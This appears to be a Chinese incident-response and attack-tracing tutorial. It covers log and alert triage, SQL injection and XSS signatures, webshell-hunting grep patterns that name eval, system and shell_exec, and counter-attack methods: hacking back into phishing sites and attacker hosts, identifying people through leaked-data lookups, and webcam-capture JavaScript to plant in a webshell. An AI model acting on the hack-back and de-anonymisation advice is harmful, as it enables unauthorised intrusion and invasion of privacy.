+    <a href="#9%e6%8b%bf%e5%88%b0%e6%97%a5%e5%bf%97%e5%a6%82%e4%bd%95%e5%88%86%e6%9e%90" class="header-mark"></a>1.0.9 （9）拿到日志如何分析</h4><ol>
+<li>特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析</li>
+<li>在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征</li>
+<li>漏洞扫描检查</li>
+<li>可以匹配user-agent特征的方式进行检测</li>
+<li>暴力破解检测</li>
+<li>webshell检测</li>
+</ol>
+<h4 id="10sql注入有哪些常见的特征" class="headerLink">
+    <a href="#10sql%e6%b3%a8%e5%85%a5%e6%9c%89%e5%93%aa%e4%ba%9b%e5%b8%b8%e8%a7%81%e7%9a%84%e7%89%b9%e5%be%81" class="header-mark"></a>1.0.10 （10）SQL注入有哪些常见的特征？</h4><ul>
+<li>**一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等</li>
+<li>**一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。</li>
+</ul>
+<h4 id="11xss弹窗函数和常见的xss绕过策略" class="headerLink">
+    <a href="#11xss%e5%bc%b9%e7%aa%97%e5%87%bd%e6%95%b0%e5%92%8c%e5%b8%b8%e8%a7%81%e7%9a%84xss%e7%bb%95%e8%bf%87%e7%ad%96%e7%95%a5" class="header-mark"></a>1.0.11 （11）XSS弹窗函数和常见的XSS绕过策略？</h4><ul>
+<li>**弹窗函数：**alert、confirm、prompt、onclick</li>
+<li>**绕过策略：**大小写混写；双写；&lt;img/src=1&gt;；%0a或者%0d绕过；拼凑绕过</li>
+</ul>
+<h4 id="12无文件webshell实现的方式有哪些" class="headerLink">
+    <a href="#12%e6%97%a0%e6%96%87%e4%bb%b6webshell%e5%ae%9e%e7%8e%b0%e7%9a%84%e6%96%b9%e5%bc%8f%e6%9c%89%e5%93%aa%e4%ba%9b" class="header-mark"></a>1.0.12 （12）无文件Webshell实现的方式有哪些？</h4><ul>
+<li>基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell</li>
+<li>基于特定框架，如 Spring 框架下动态注册 Controller 等。</li>
+<li>基于 JAVA Agent，如 memShell</li>
+</ul>
+<h4 id="13响应状态码都有哪些" class="headerLink">
+    <a href="#13%e5%93%8d%e5%ba%94%e7%8a%b6%e6%80%81%e7%a0%81%e9%83%bd%e6%9c%89%e5%93%aa%e4%ba%9b" class="header-mark"></a>1.0.13 （13）响应状态码都有哪些？</h4><p>不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑）</p>
+<ul>
+<li>
+<p>**404：**404 状态码表示请求资源不存在，即表示攻击失败；</p>
+</li>
+<li>
+<p>**200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断</p>
+</li>
+<li>
+<p>**401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。</p>
+</li>
+<li>
+<p>**500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。</p>
+</li>
+<li>
+<p>**301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。</p>
+</li>
+<li>
+<p>**302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL.</p>
+</li>
+</ul>
+<h4 id="14发现一个sql注入告警怎么判断" class="headerLink">
+    <a href="#14%e5%8f%91%e7%8e%b0%e4%b8%80%e4%b8%aasql%e6%b3%a8%e5%85%a5%e5%91%8a%e8%ad%a6%e6%80%8e%e4%b9%88%e5%88%a4%e6%96%ad" class="header-mark"></a>1.0.14 （14）发现一个SQL注入告警怎么判断？</h4><p>天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。</p>
+<h2 id="攻击源捕获" class="headerLink">
+    <a href="#%e6%94%bb%e5%87%bb%e6%ba%90%e6%8d%95%e8%8e%b7" class="header-mark"></a>2 攻击源捕获：</h2><p>发生<a href="https://so.csdn.net/so/search?q=%e7%bd%91%e7%bb%9c%e6%94%bb%e5%87%bb&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">网络攻击</a>事件的时候，我们应急响应的过程中，需要通过安全设备辅助，利用IDS/IPS/态势感知/蜜罐/沙箱甚至是全流量的告警辅助的手法去获取攻击者的信息，比如攻击者开始<strong>攻击的时间</strong>、<strong>攻击的手法</strong>、<strong>利用的漏洞</strong>、<strong>攻击入口点</strong>、是否在服务器里留下<strong>后门</strong>、<strong>攻击者IP</strong>，<strong>被攻击主机</strong>等，获取此类信息不仅仅是为了<strong>后续的溯源取证</strong>，也为了<strong>后续的加固</strong></p>
+<h2 id="日志审计" class="headerLink">
+    <a href="#%e6%97%a5%e5%bf%97%e5%ae%a1%e8%ae%a1" class="header-mark"></a>3 日志审计：</h2><p>服务器的安全日志、web服务日志、数据库日志、安全设备相关日志（waf日志、安全软件日志等）</p>
+<p>与流量分析，通过异常流量分析具体攻击行为、攻击手法、攻击源地址与目的地址</p>
+<p>服务器异常捕获，异常的文件程序。非正常用户、恶意的外部通信、异常进程、端口、计划任务、启动项、注册表、快捷方式、隐藏文件等</p>
+<h2 id="网络攻击溯源" class="headerLink">
+    <a href="#%e7%bd%91%e7%bb%9c%e6%94%bb%e5%87%bb%e6%ba%af%e6%ba%90" class="header-mark"></a>4 网络攻击溯源：</h2><p>可细分为<strong>追踪溯源攻击主机</strong>、<strong>追踪溯源攻击控制主机</strong>、<strong>追踪溯源攻击者</strong>、<strong>追踪溯源攻击组织机构</strong></p>
+<p>常用溯源分析方法包括<strong>域名/IP地址分析</strong>、<strong>入侵日志监测</strong>、<strong>全流量分析</strong>、<strong>同源分析</strong>、<strong>攻击模型分析</strong></p>
+<p>通过查询域名的<strong>whois信息</strong>，可以关联到攻击者部分信息，注册名，注册邮箱，注册地址，电话，注册时间，服务商等。</p>
+<p>溯源的<strong>一般会获取到几个相关信息</strong>:攻击时间、攻击IP、攻击类型、恶意文件、受攻击的IP或域名。其中攻击IP、攻击类型、恶意文件、攻击详情是溯源分析的入手点。</p>
+<p>通过攻击类型分析攻击详情的请求包，验证是否可以获取到攻击者相关信息，然后通过相关特征进行威胁情报查询来判断所用IP具体是代理的IP还是真实IP地址。</p>
+<h3 id="溯源流程" class="headerLink">
+    <a href="#%e6%ba%af%e6%ba%90%e6%b5%81%e7%a8%8b" class="header-mark"></a>4.1 溯源流程：</h3><h5 id="1信息查询" class="headerLink">
+    <a href="#1%e4%bf%a1%e6%81%af%e6%9f%a5%e8%af%a2" class="header-mark"></a>4.1.0.1 1、信息查询：</h5><p>//威胁情报平台</p>
+<p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener noreferrer">https://x.threatbook.cn/</a>			 	//微步X情报社区</p>
+<p><a href="https://ti.qianxin.com/" target="_blank" rel="noopener noreferrer">https://ti.qianxin.com/</a>					//奇安信威胁情报平台</p>
+<p><a href="https://ti.360.cn/" target="_blank" rel="noopener noreferrer">https://ti.360.cn/</a>						  	//360威胁情报平台</p>
+<p><a href="https://www.venuseye.com.cn/" target="_blank" rel="noopener noreferrer">https://www.venuseye.com.cn/</a>		//启明星辰威胁情报中心</p>
+<p><a href="https://community.riskiq.com/" target="_blank" rel="noopener noreferrer">https://community.riskiq.com/</a>		//RiskIQ威胁情报平台</p>
+<p><strong>//ip查域名</strong></p>
+<p><a href="https://www.ipip.net/ip.html" target="_blank" rel="noopener noreferrer">https://www.ipip.net/ip.html</a>			//IPIP平台</p>
+<p><a href="https://www.aizhan.com/" target="_blank" rel="noopener noreferrer">https://www.aizhan.com/</a>				//爱站</p>
+<p><a href="https://www.whois.com/" target="_blank" rel="noopener noreferrer">https://www.whois.com/</a>				//whois查询</p>
+<p><strong>//IP定位</strong></p>
+<p><a href="https://chaipip.com/" target="_blank" rel="noopener noreferrer">https://chaipip.com/</a>						//高精度IP定位</p>
+<h5 id="2定位目标利用精准ip定位进行ip目标位置的确定" class="headerLink">
+    <a href="#2%e5%ae%9a%e4%bd%8d%e7%9b%ae%e6%a0%87%e5%88%a9%e7%94%a8%e7%b2%be%e5%87%86ip%e5%ae%9a%e4%bd%8d%e8%bf%9b%e8%a1%8cip%e7%9b%ae%e6%a0%87%e4%bd%8d%e7%bd%ae%e7%9a%84%e7%a1%ae%e5%ae%9a" class="header-mark"></a>4.1.0.2 2、定位目标：利用精准IP定位，进行IP目标位置的确定</h5><h5 id="3收集互联网信息侧的用户id" class="headerLink">
+    <a href="#3%e6%94%b6%e9%9b%86%e4%ba%92%e8%81%94%e7%bd%91%e4%bf%a1%e6%81%af%e4%be%a7%e7%9a%84%e7%94%a8%e6%88%b7id" class="header-mark"></a>4.1.0.3 3、收集互联网信息侧的用户ID</h5><p>可以通过利用：微博、贴吧、知乎、豆瓣、脉脉、QQ、微信等社交平台进行对信息收集。如果获取到手机号码可以基于支付方式的支付宝信息、微信信息等支付渠道的信息。</p>
+<h5 id="4进入跳板机收集信息" class="headerLink">
+    <a href="#4%e8%bf%9b%e5%85%a5%e8%b7%b3%e6%9d%bf%e6%9c%ba%e6%94%b6%e9%9b%86%e4%bf%a1%e6%81%af" class="header-mark"></a>4.1.0.4 4、进入跳板机收集信息</h5><p>如果有能力控制了红队的跳板机，则可进入跳板机进行信息收集，查看命令执行的历史记录与日志等</p>
+<h3 id="邮件钓鱼攻击溯源" class="headerLink">
+    <a href="#%e9%82%ae%e4%bb%b6%e9%92%93%e9%b1%bc%e6%94%bb%e5%87%bb%e6%ba%af%e6%ba%90" class="header-mark"></a>4.2 邮件钓鱼攻击溯源：</h3><p>钓鱼邮件攻击通常分为两种：一种带有<strong>附件的word宏病毒</strong>，一种是<strong>引导受害者进入钓鱼网站</strong>来获取受害者的敏感信息。</p>
+<p><strong>获取信息：<strong>通过查看</strong>邮件原文</strong>，获取发送方IP地址、域名后缀邮箱、钓鱼网站或恶意附件样本等信息</p>
+<p><strong>对钓鱼网页的处理：</strong></p>
+<ul>
+<li>
+<p>可以通过相关联的域名/IP进行追踪；</p>
+</li>
+<li>
+<p>对钓鱼网站进行反向渗透获取权限，进一步收集攻击者信息；</p>
+</li>
+</ul>
+<p><strong>对邮件附件的处理：</strong></p>
+<ul>
+<li>
+<p>对附件进行逆向，看附件是否包含红队物理路径信息，会暴露其用户名ID</p>
+</li>
+<li>
+<p>把附件放进云沙箱，提取C2域名</p>
+</li>
+<li>
+<p>邮件导出为eml格式，提取发信人IP</p>
+</li>
+<li>
+<p>尽可能多的诱导对方提供攻击样本和链接</p>
+</li>
+<li>
+<p>通过SIEM策略加快查找：</p>
+<p>同一个发件人，给超5个人发邮件的，筛出来</p>
+<p>同一个标题邮件，日志数超过10条的，筛出来</p>
+<p>所有对外公开的邮箱，逐一排查</p>
+<p>所有带附件的邮箱，考虑到免杀，再人工排查一遍</p>
+</li>
+</ul>
+<p><strong>获取到邮箱后：</strong></p>
+<ul>
+<li>WHOIS反查域名</li>
+<li>邮箱前缀可能是红队ID，搜索引擎反查</li>
+<li>天眼查、企查查反查公司</li>
+<li>reg007.com查注册过的网站，通过找回密码，进一步找信息</li>
+</ul>
+<p><strong>获取到手机号后：</strong></p>
+<ul>
+<li>查脉脉、领英，得到毕业院校、工作经历</li>
+<li>查微博、知乎、github等社交账号</li>
+<li>微信、支付宝转账，得到部分真实姓名</li>
+<li>社工库查询</li>
+</ul>
+<p><strong>拿到域名后：</strong></p>
+<p>WHOIS反查注册人，要是开启了隐私保护，就查域名历史IP解析，然后根据查到的IP，再继续查IP历史解析域名，总之套娃。</p>
+<h2 id="web入侵溯源" class="headerLink">
+    <a href="#web%e5%85%a5%e4%be%b5%e6%ba%af%e6%ba%90" class="header-mark"></a>5 web入侵溯源：</h2><p>**溯源方式：**隔离webshell样本，使用Web日志还原攻击路径，找到安全漏洞位置进行漏洞修复，从日志可以找到攻击者的IP地址，但攻击者一般都会使用代理服务器或匿名网络（例如Tor）来掩盖其真实的IP地址。</p>
+<p>在入侵过程中，使用反弹shell、远程下载恶意文件、端口远程转发等方式，也容易触发威胁阻断，而这个域名/IP，提供一个反向信息收集和渗透测试的路径。</p>
+<h2 id="溯源反制" class="headerLink">
+    <a href="#%e6%ba%af%e6%ba%90%e5%8f%8d%e5%88%b6" class="header-mark"></a>6 溯源反制：</h2><h4 id="ip定位法" class="headerLink">
+    <a href="#ip%e5%ae%9a%e4%bd%8d%e6%b3%95" class="header-mark"></a>6.0.1 IP定位法：</h4><p><strong>未挂代理：</strong>
+直接获取真实IP，直接获取物理定位信息</p>
+<p><strong>挂代理：</strong>
+①傀儡机进行跳板攻击
+对傀儡机进行漏洞探测，获取傀儡机权限后层层剥离最终获取真实IP</p>
+<p>②使用http代理或VPN/TOR多级代理
+如果仅仅是HTTP代理，可以通过翻看以前的日志记录或通过流量设备查看其他协议记录，例如若是有ICMP协议、UDP协议的探测记录；若是多级代理，VPN机场结合TOR多层代理(放弃吧&hellip;)</p>
+<h4 id="蜜罐捕获法" class="headerLink">
+    <a href="#%e8%9c%9c%e7%bd%90%e6%8d%95%e8%8e%b7%e6%b3%95" class="header-mark"></a>6.0.2 蜜罐捕获法：</h4><p>利用蜜罐获取攻击者信息：</p>
+<p>攻击源、攻击设备指纹、攻击次数、攻击链路、攻击者ID</p>
+<h4 id="常规渗透反打" class="headerLink">
+    <a href="#%e5%b8%b8%e8%a7%84%e6%b8%97%e9%80%8f%e5%8f%8d%e6%89%93" class="header-mark"></a>6.0.3 常规渗透反打：</h4><h5 id="ip有服务" class="headerLink">
+    <a href="#ip%e6%9c%89%e6%9c%8d%e5%8a%a1" class="header-mark"></a>6.0.3.1 IP有服务：</h5><p>IP反查，若是有域名信息，可以查询域名注册信息、电话号码、邮箱等
+通过现有的服务进行常规渗透测试，渗透服务器控制权限</p>
+<h5 id="ip无服务" class="headerLink">
+    <a href="#ip%e6%97%a0%e6%9c%8d%e5%8a%a1" class="header-mark"></a>6.0.3.2 IP无服务：</h5><p>端口探测，常规漏洞攻击</p>
+<h2 id="webshell溯源反制" class="headerLink">
+    <a href="#webshell%e6%ba%af%e6%ba%90%e5%8f%8d%e5%88%b6" class="header-mark"></a>7 webshell溯源反制：</h2><h4 id="webshell查杀" class="headerLink">
+    <a href="#webshell%e6%9f%a5%e6%9d%80" class="header-mark"></a>7.0.4 webshell查杀：</h4><h5 id="工具查杀" class="headerLink">
+    <a href="#%e5%b7%a5%e5%85%b7%e6%9f%a5%e6%9d%80" class="header-mark"></a>7.0.4.1 工具查杀：</h5><p>1、d盾：</p>
+<p><a href="http://www.d99net.net/" target="_blank" rel="noopener noreferrer">http://www.d99net.net/</a></p>
+<p>3、网站安全狗：</p>
+<p><a href="https://www.safedog.cn/website_safedog.html" target="_blank" rel="noopener noreferrer">https://www.safedog.cn/website_safedog.html</a></p>
+<p>3、百度webshell查杀引擎：</p>
+<p><a href="https://scanner.baidu.com/#/pages/intro" target="_blank" rel="noopener noreferrer">https://scanner.baidu.com/#/pages/intro</a></p>
+<h5 id="手工查杀" class="headerLink">
+    <a href="#%e6%89%8b%e5%b7%a5%e6%9f%a5%e6%9d%80" class="header-mark"></a>7.0.4.2 手工查杀：</h5><p>由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。</p>
+<p><strong>1.上传目录关键字查找</strong>
+上传目录是最有可能存在websehll的，一般来说要优先排查上传目录</p>
+<p>脚本代码排查：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">grep</span> <span class="o">-</span><span class="n">rn</span> <span class="n">php</span> <span class="n">upload</span><span class="o">/</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>关键字排查：
+排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">find</span> <span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">upload</span> <span class="o">-</span><span class="n">name</span> <span class="s2">&#34;*.php&#34;</span> <span class="o">|</span><span class="n">xargs</span> <span class="n">egrep</span> <span class="s1">&#39;assert|bash|system|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval\(|file_put_contents|base64_decode&#39;</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>2.web非上传目录排查增删改查</strong></p>
+<p>如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。</p>
+<p>备份对比
+对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vimdiff &lt;(cd /tmp/1.1; find . | sort) &lt;(cd /tmp/1.2; find . | sort) 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>3.时间戳排查</strong>
+根据情况调取短期内改动文件进行分析</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find / -mtime -10 -mtime +1 2&gt;/dev/null #一天前，十天内变动的文件 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>4.文件名排查</strong>
+使用tree命令列举整个web目录文件，然后排查可疑文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">tree</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>5.日志排查</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nb">log</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">access</span><span class="o">.</span><span class="n">log</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">&#34;antSword&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="webshell反打" class="headerLink">
+    <a href="#webshell%e5%8f%8d%e6%89%93" class="header-mark"></a>7.0.5 webshell反打：</h4><p>webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息
+（只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的）</p>
+<h5 id="获取照片" class="headerLink">
+    <a href="#%e8%8e%b7%e5%8f%96%e7%85%a7%e7%89%87" class="header-mark"></a>7.0.5.1 获取照片：</h5><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">function</span> <span class="n">takePhoto</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="err">获取</span><span class="n">video元素</span>
+</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">video</span> <span class="o">=</span> <span class="n">document</span><span class="o">.</span><span class="n">getElementById</span><span class="p">(</span><span class="s2">&#34;video&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="err">创建一个</span><span class="n">canvas元素</span>
+</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">canvas</span> <span class="o">=</span> <span class="n">document</span><span class="o">.</span><span class="n">createElement</span><span class="p">(</span><span class="s2">&#34;canvas&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="err">设置</span><span class="n">canvas元素的大小</span>
+</span></span><span class="line"><span class="cl">        <span class="n">canvas</span><span class="o">.</span><span class="n">width</span> <span class="o">=</span> <span class="n">video</span><span class="o">.</span><span class="n">videoWidth</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">canvas</span><span class="o">.</span><span class="n">height</span> <span class="o">=</span> <span class="n">video</span><span class="o">.</span><span class="n">videoHeight</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="err">将</span><span class="n">video图像画到canvas上</span>
+</span></span><span class="line"><span class="cl">        <span class="n">canvas</span><span class="o">.</span><span class="n">getContext</span><span class="p">(</span><span class="s2">&#34;2d&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">drawImage</span><span class="p">(</span><span class="n">video</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="err">将</span><span class="n">canvas元素转换为图片并显示</span>
+</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">image</span> <span class="o">=</span> <span class="n">new</span> <span class="ne">Image</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">image</span><span class="o">.</span><span class="n">src</span> <span class="o">=</span> <span class="n">canvas</span><span class="o">.</span><span class="n">toDataURL</span><span class="p">(</span><span class="s2">&#34;image/png&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">document</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">appendChild</span><span class="p">(</span><span class="n">image</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;!--</span> <span class="err">创建一个</span><span class="n">video元素</span> <span class="o">--&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">video</span> <span class="n">id</span><span class="o">=</span><span class="s2">&#34;video&#34;</span> <span class="n">width</span><span class="o">=</span><span class="s2">&#34;640&#34;</span> <span class="n">height</span><span class="o">=</span><span class="s2">&#34;480&#34;</span> <span class="n">autoplay</span><span class="o">&gt;&lt;/</span><span class="n">video</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;!--</span> <span class="err">创建一个按钮，点击拍照</span> <span class="o">--&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">button</span> <span class="n">onclick</span><span class="o">=</span><span class="s2">&#34;takePhoto()&#34;</span><span class="o">&gt;</span><span class="n">Take</span> <span class="n">Photo</span><span class="o">&lt;/</span><span class="n">button</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;!--</span> <span class="err">请求访问用户的摄像头</span> <span class="o">--&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">//</span> <span class="err">创建一个</span><span class="n">MediaStream对象</span>
+</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="n">stream</span> <span class="o">=</span> <span class="n">navigator</span><span class="o">.</span><span class="n">mediaDevices</span><span class="o">.</span><span class="n">getUserMedia</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">        <span class="n">video</span><span class="p">:</span> <span class="bp">true</span>
+</span></span><span class="line"><span class="cl">      <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="o">//</span> <span class="err">将</span><span class="n">MediaStream对象绑定到video元素上</span>
+</span></span><span class="line"><span class="cl">      <span class="n">stream</span><span class="o">.</span><span class="n">then</span><span class="p">(</span><span class="n">function</span><span class="p">(</span><span class="n">mediaStream</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">video</span> <span class="o">=</span> <span class="n">document</span><span class="o">.</span><span class="n">getElementById</span><span class="p">(</span><span class="s2">&#34;video&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">video</span><span class="o">.</span><span class="n">srcObject</span> <span class="o">=</span> <span class="n">mediaStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="获取攻击者访问的时间ip" class="headerLink">
+    <a href="#%e8%8e%b7%e5%8f%96%e6%94%bb%e5%87%bb%e8%80%85%e8%ae%bf%e9%97%ae%e7%9a%84%e6%97%b6%e9%97%b4ip" class="header-mark"></a>7.0.5.2 获取攻击者访问的时间、ip：</h5><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
